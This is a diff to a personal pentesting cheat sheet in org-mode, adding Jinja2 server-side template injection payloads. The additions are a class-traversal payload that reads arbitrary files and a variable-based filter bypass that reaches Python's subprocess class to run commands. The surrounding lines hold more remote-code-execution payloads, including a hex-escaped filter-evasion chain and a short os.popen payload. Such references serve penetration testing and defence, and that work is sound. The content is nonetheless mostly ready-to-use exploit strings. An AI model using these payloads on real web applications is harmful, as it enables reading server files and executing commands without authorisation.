@@ -2675,6 +2675,7 @@
           @(7/0)
           ``
         #+end_src
+      - Also try with statements performing common actions (~{%print("test")%}~) instead of just expressions (~{{7*7}}~)
 **** Cheatsheets
      - [[https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection][HackTricks]]
      - [[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection][PayloadAllTheThings]]
@@ -2753,11 +2754,30 @@
        #+begin_src conf
          {{conf|ppprint}}  # See Encryption_key
        #+end_src
+     - Read files
+       #+begin_src conf
+         # Python 2.7
+         {{''.__class__.__mro__[2].__subclasses__()[40]('<full-path-to-file>').read()}}
+
+         # Python 3
+         {{''.__class__.__mro__[1].__subclasses__()[40]('<full-path-to-file>').read()}}
+       #+end_src
      - RCE
        #+begin_src conf
          # Bypass most common filters: '.',
          # '_','|join','[',']','mro','base'
          {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('<cmd>')|attr('read')()}}
+
+         # Other bypass way using variables
+         {% set string = "test" %}
+         {% set class = "__class__" %}
+         {% set mro = "__mro__" %}
+         {% set subclasses = "__subclasses__" %}
+         {% set mro_r = string|attr(class)|attr(mro) %}
+         # mro_r[1] is <object> class
+         {% set subclasses_r = mro_r[1]|attr(subclasses)() %}
+         # subclasses_r[420] is <subprocess> class
+         {{ subclasses_r[420](["</path/to/bin>","<arg1>"])|read() }}
 
          # Shortest payloads
          {{ cycler.__init__.__globals__.os.popen('<cmd>').read() }}
